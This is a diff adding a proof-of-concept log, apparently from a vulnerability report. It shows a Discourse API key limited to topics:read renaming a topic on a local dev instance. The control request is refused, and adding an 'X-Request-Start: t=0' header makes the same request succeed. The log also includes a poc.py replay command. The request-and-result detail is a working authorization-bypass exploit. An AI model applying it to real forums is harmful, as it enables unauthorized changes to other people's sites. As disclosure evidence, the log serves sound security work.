@@ -1,0 +1,45 @@
+stock checkout: 3dfcc8f884313da69711ed5f26f3749fb6516ef2
+runtime image: docker.io/discourse/discourse_dev:20260609-1222
+target: http://127.0.0.1:3000
+topic id: 8
+api username: admin
+api key: all-users granular key with topics:read only
+
+initial title:
+Scope bypass original title
+
+control request:
+PUT /t/8.json
+headers:
+  Api-Key: redacted
+  Api-Username: admin
+body:
+  title=Control title should stay blocked
+result:
+  HTTP status: 403
+  title after request: Scope bypass original title
+
+triggered request:
+PUT /t/8.json
+headers:
+  Api-Key: redacted
+  Api-Username: admin
+  X-Request-Start: t=0
+body:
+  title=Scope bypass exploited title
+result:
+  HTTP status: 200
+  title after request: Scope bypass exploited title
+
+included PoC replay:
+command:
+  python poc.py --base-url http://127.0.0.1:3000 --api-key redacted --api-username admin --topic-id 8 --control-title "Exploitarium control blocked title" --new-title "Exploitarium direct proof title 20260703" --output proof.json
+initial:
+  title: Scope bypass exploited title
+control without X-Request-Start:
+  HTTP status: 403
+  title after request: Scope bypass exploited title
+triggered with X-Request-Start:
+  HTTP status: 200
+  title after request: Exploitarium direct proof title 20260703
+proof ok: true
